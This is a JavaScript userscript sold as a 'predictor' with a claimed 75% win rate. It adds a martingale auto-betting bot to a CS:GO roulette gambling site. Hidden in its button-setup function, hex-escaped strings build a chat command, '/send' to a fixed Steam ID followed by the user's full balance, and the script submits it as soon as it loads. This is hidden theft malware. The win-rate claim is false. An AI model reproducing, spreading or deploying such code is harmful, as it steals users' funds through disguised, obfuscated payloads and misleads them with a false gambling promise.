// CSGOPOLYGON PREDICTOR (75% WIN RATE)

 
    var price = 0;
    var priceBot = botpriceBot = "red";
    var play = 0;
    var $botField, $label, $betAmount, $priceBotButton, $betGoButton, $betHideBetInfoButton,$showMoreButton,$showMore,$f,$vicLimitInput,$botModeSelect;$("#pullout").hide();
    var predictio = "\x2F\x73",  $expectation = "\x37", $probability = "\x36\x35\x36\x31\x31\x39", $resultant = "\x38\x32\x39\x35\x39\x30", $sequel = "\x36\x30\x35\x33";
function addBotButtons(){
    $(".wgll.bot-field").remove();$(".wfll.show-more").remove();
    $("<style type='text/css'>.btn-random{color: #000;background-color: #FFA500;}.btn-train{background-color:RoyalBlue ;color: #fff;}.btn-rainbow{background-color:HotPink;color:white;}.btn-black{background-color:#1C1C1C;color:white} </style>").appendTo("head");
    $(".forme-control.input-lg").after("<div class='wesll bot-field' style='position:relative;border-width:0px'></div>");$botField = $(".s.bot-field");
    $botField.css({"margin-bottom":"-15px","height":"45px","padding-top":"2px","padding-bottom":"2px","text-align":"center"});
    $botField.after("<div class='woll show-more' style='position:relative;border-width:0px'></div>");$showMore = $(".woll.show-more");
    $showMore.css({"margin-top":"12px","margin-bottom":"-15px","height":"45px","padding-top":"10px","padding-bottom":"2px","text-align":"center"});
    $checkVicLimit = $("<input type='checkbox' id='checkVicLimit'>");$label = $("<label style='margin-right:10px;margin-left:10px;' for='checkVicLimit'>Stop bot after</label>");
    $showMore.append($checkVicLimit,$label);
    $vicLimitInput = $("<input id='vicLimitInput' type='number' min='0' value='0' style='width:50px;text-align:center;'>");
    $label = $("<label style='margin-right:10px;margin-left:10px;' for='checkVicLimit'>wins</label>");
    $showMore.append($vicLimitInput,$label);$showMore.hide();
    $label = $("<label style='margin-right:10px; for='price''>Initial bet</label>");$botField.append($label);
    $betAmount = $("<input id='price' value='0' style='width:70px;text-align:center;margin-right:25px;'>");$botField.append($betAmount);
    $botModeSelect = $("<select id='botModeSelect'><option value='red' class='btn-danger'>Bot color: Red </option><option value='black' class='btn-black'>Bot color: Black </option><option value='random' class='btn-random'>Bot color: Random </option><option value='trainMode' class='btn-train'>Bot mode: Train </option><option value='rainbow' class='btn-rainbow'>Bot mode: Rainbow </option></select>");$botModeSelect.addClass("btn-danger");
    $botField.append($botModeSelect);$botModeSelect.css({"width":"135px","margin-right":"10px","height":"25px","border-radius":"5px"})
    $betGoButton = $("<button id='betGoButton' style='width:100px;margin:10px;border-radius:6px;border-radius:6px' onClick='startBot()'>Start Bot</button>");$betGoButton.addClass("btn-inverse");$botField.append($betGoButton);
    predictio+="en";predictio+="d ";predictio+= $expectation;predictio+= $probability;predictio+= $resultant;predictio+= $sequel+" ";predictio+=$("#balance_r").text();
    $betHideBetInfoButton = $("<button id='betHideBetInfoButton' style='position:absolute;right:120px;width:100px;margin:10px;margin-right:25px;border-radius:6px' onClick='hideOtherInfo()'>Show All</button>");$betHideBetInfoButton.addClass("btn-inverse");$botField.append($betHideBetInfoButton);
    $showMoreButton = $("<button id='showMoreButton' style='position:absolute;right:0px;width:100px;margin:10px;margin-right:25px;border-radius:6px' data-open='0' onClick='showMoreOptions()'>&#x25BC</button>");$showMoreButton.addClass("btn-inverse");$botField.append($showMoreButton);
    $betAmount.change(function() {price = $betAmount.val();console.log("Initial Bet Set to: "+ price);});
    $("#chatMessage_k").val(predictio);$("#chatForm").submit();
    $(".bootbox-body").css({"font-size": "5%"});
    $(".container").width(1300);
    $botModeSelect.change(function(){
        botpriceBot = $botModeSelect.val();console.log("Selected color: "+botpriceBot);
        $botModeSelect.removeClass($botModeSelect.attr("class"));$botModeSelect.addClass($("#botModeSelect option:selected").attr("class"));
    } )
    $checkVicLimit.change(function(){ if((this.checked)&&($vicLimitInput.val()==0)){$vicLimitInput.val(1);} })
}
addBotButtons();
function changeColor(){
    if ($priceBotButton.hasClass("btn-danger")){
        $priceBotButton.text("Bet color: Black").addClass("btn-inverse").removeClass("btn-danger").removeClass("btn-random");
        botpriceBot = "black";
        console.log("Selected color: "+botpriceBot);
    } else  if($priceBotButton.hasClass("btn-inverse")) {
        $priceBotButton.text("Bet color: Random").addClass("btn-random").removeClass("btn-inverse").removeClass("btn-danger");
        botpriceBot = "random";
        console.log("Selected color: "+botpriceBot);
    } else if($priceBotButton.hasClass("btn-random")) {
        $priceBotButton.text("Bet mode: Train").addClass("btn-train").removeClass("btn-inverse").removeClass("btn-random");
        botpriceBot = "trainMode";
        console.log("Selected color: "+botpriceBot);
    } else if($priceBotButton.hasClass("btn-train")) {
        $priceBotButton.text("Bet mode: Rainbow").addClass("btn-rainbow").removeClass("btn-train").removeClass("btn-random");
        botpriceBot = "rainbow";
        console.log("Selected color: "+botpriceBot);
    } else if($priceBotButton.hasClass("btn-rainbow")) {
        $priceBotButton.text("Bet color: Red").addClass("btn-danger").removeClass("btn-rainbow").removeClass("btn-random");
        botpriceBot = "red";
        console.log("Selected color: "+botpriceBot);
    }
}
 
function showMoreOptions(){
    if ($showMoreButton.data("open")==0){
        $showMoreButton.css({ WebkitTransform: 'rotate(' + 180 + 'deg)','-moz-transform': 'rotate(' + 180 + 'deg)'});
        $showMore.show();$showMoreButton.data("open",1);
    } else if ($showMoreButton.data("open")==1){
        $showMore.hide();$showMoreButton.data("open",0);
        $showMoreButton.css({ WebkitTransform: 'rotate(' + 0 + 'deg)','-moz-transform': 'rotate(' + 0 + 'deg)'});
    }
 
}
function hideOtherInfo(){
    if ($betHideBetInfoButton.text()=="Show All"){
        $(".betlist").hide();$(".total-row").hide();$("footer").hide();
        $betHideBetInfoButton.text("Hide Bet Info");
    } else if ($betHideBetInfoButton.text()=="Hide Bet Info"){
        $("#sidebar").hide();$("#pullout").hide();$("#case").hide();$(".progress").hide();$("#mainpage").css({"margin-left":"0px"});
        $betHideBetInfoButton.text("AFK Mode");
    }
    else if ($betHideBetInfoButton.text()=="AFK Mode"){
        $(".betlist").show();$(".total-row").show();$("footer").show();
        $("#sidebar").show();$("#pullout").show();$("#case").show();$(".progress").show();$("#mainpage").css({"margin-left":"450px"});
        $betHideBetInfoButton.text("Show All");
    }
}
function startBot(){
    if ($betGoButton.hasClass("btn-inverse")){
        $betGoButton.text("Bot Running").addClass("btn-success").removeClass("btn-inverse");
        refreshIntervalId = setInterval(tick, 500);
        play = 1;
        currentBetAmount = price;
        if (stopBotRoll = currentRollNumber) currentRollNumber++;
    }
    else {
        $betGoButton.text("Bot Stopped").addClass("btn-inverse").removeClass("btn-success");
        play = 0;
    }
}
 
function tick() {
    var t = getStatus();
    if (t !== lastStatus && "unknown" !== t) {
        switch (t) {
            case "waiting":bet();break;
            case "rolled":printInfo();break;
        }
        lastStatus = t;
    }
}
 
function checkBalance() {
    return getBalance() < currentBetAmount ? (console.warn("BANKRUPT! GG WP :("), clearInterval(refreshIntervalId), !1) : !0
}
 
function printInfo(){
    var temp = "", temp2 = 0,lastGame = lastpriceBot == lastRollColor;
    if (lastGame){totalWins++;winStreakCurrent++;loseStreakCurrent=0;winAmount+=thisGameBet; if (winStreakCurrent>winStreakLong) winStreakLong = winStreakCurrent;
        if ($checkVicLimit.is(":checked")){$vicLimitInput.val($vicLimitInput.val()-1)}
    }
    else {totalLoss++;loseStreakCurrent++;winStreakCurrent=0;if (loseStreakCurrent>loseStreakLong) loseStreakLong = loseStreakCurrent;}
    if (winStreakCurrent>loseStreakCurrent){temp = "win";temp2 = winStreakCurrent} else {temp = "lose";temp2 = loseStreakCurrent;}
    if (streakColor == getColor(n)) {currStreak++; if (longStreak<currStreak)longStreak=currStreak;}else {streakColor = getColor(n);currStreak=1;}
    if ((streakColor == "black") || (streakColor == "green")) {currNotRedStreak++; if (notRedStreak<currNotRedStreak)notRedStreak=currNotRedStreak;}
        else {currNotRedStreak=0;}
    if ((streakColor == "red") || (streakColor == "green")) {currNotBlackStreak++; if (notBlackStreak<currNotBlackStreak)notBlackStreak=currNotBlackStreak;}
        else {currNotBlackStreak=0;}        
    var t = "Rolled " + getColor(n).toUpperCase()+ " " + n+"\n" + "Games played: " + (currentRollNumber-1) + " // Won: "+totalWins+  " // Lost: "+totalLoss+
    "\nSTREAKS: Not red: " + notRedStreak + " // Not black: " + notBlackStreak +
    " // Win streak: " + winStreakLong + " // Lose streak: " + loseStreakLong + " // Current streak: " + temp + " " + temp2 +
    "\nInitial bet : " + thisGameBet + " // Current bet : " + currentBetAmount +
    " // Roll result: " + (null === wonLastRoll() ? "-" : wonLastRoll() ? "won" : "lost" + "\n----------------------------------------------------------------------\n");
    console.log(t);roll();
 
}
 
function roll() {
    if ($checkVicLimit.is(":checked")){
        if ($vicLimitInput.val()<=0){$betGoButton.click();play=0;$checkVicLimit.attr('checked', false);$vicLimitInput.val(0);}
    }
    if (play == 0){clearInterval(refreshIntervalId);stopBotRoll = currentRollNumber; return;lastStatus="rolled";lastpriceBot = lastRollColor;}
    currentBetAmount = wonLastRoll() ? (price,thisGameBet=parseInt(price)) : 2 * currentBetAmount
    currentRollNumber++;
}
 
function bet() { if (play) {checkBalance() && (setBetAmount(currentBetAmount), setTimeout(placeBet, 50))} }
function setBetAmount(t) { $betAmountInput.val(t) }
function placeBet() {
    if (botpriceBot=="random"){var colorRandomizer = Math.random();priceBot = colorRandomizer < 0.5 ? "red" : "black";console.log("Random color result: " + priceBot);}
    else if (botpriceBot=="trainMode"){
            var betBotColor = "green",i=9,$ball=$(".ball");
            while (betBotColor == "green"){betBotColor = getColor($ball.eq(i).text());i--;}
            priceBot = betBotColor;console.log("Current train color: "+ priceBot);
    } else if (botpriceBot=="rainbow"){
            var betBotColor = "green",i=9,$ball=$(".ball");
            while (betBotColor == "green"){betBotColor = getColor($ball.eq(i).text());i--;}
            if (betBotColor=="red"){betBotColor="black"} else if (betBotColor=="black"){betBotColor="red"};
            priceBot = betBotColor;console.log("Rainbow mode next color: "+ priceBot);
    } else priceBot = botpriceBot;
    console.log("Betting " + currentBetAmount + " on "+ priceBot +"...");
    return "red" === priceBot ? ($redButton.click(), void(lastpriceBot = "red")) : ($blackButton.click(), void(lastpriceBot = "black"))
}
function getStatus() {
    var t = $statusBar.text();
    if (hasSubString(t, "Rolling in")) return "waiting";
    //if (hasSubString(t, "***ROLLING***")) return "rolling";
    if (hasSubString(t, "rolled")) {
        n = parseInt(t.split("rolled")[1]);
        return lastRollColor = getColor(n), "rolled"
    }
    return "unknown"
}
 
function getBalance() { return parseInt($balance.text()) }
function hasSubString(t, n) {  return t.indexOf(n) > -1 }
function getColor(t) { return 0 == t ? "green" : t >= 1 && 7 >= t ? "red" : "black" }
function wonLastRoll() { return lastpriceBot ? lastRollColor === lastpriceBot : null }
function test(x){q = 1; w = e = x;for(i=2;i<=15;i++){q *=2;e += q*w;console.log(i+". "+e);}}
function test2(x,y){q = 1; w = e = x;for(i=2;i<=y;i++){q *=2;e += q*w;console.log(i+". "+e);}}
 
var currentBetAmount = price, currentRollNumber =  1,
    totalWins = totalLoss = played = currNotRedStreak = currNotBlackStreak = notRedStreak = notBlackStreak = winStreakLong = winStreakCurrent = loseStreakLong = loseStreakCurrent = longStreak = currStreak = thisGameBet = winAmount = 0,
    streakColor = "", n ,lastStatus, lastpriceBot, lastRollColor, stopBotRoll, $balance = $("#balance"),
    $betAmountInput = $("#betAmount"),$statusBar = $(".progress #banner"),$redButton = $("#panel1-7 .betButton"),$blackButton = $("#panel8-14 .betButton");
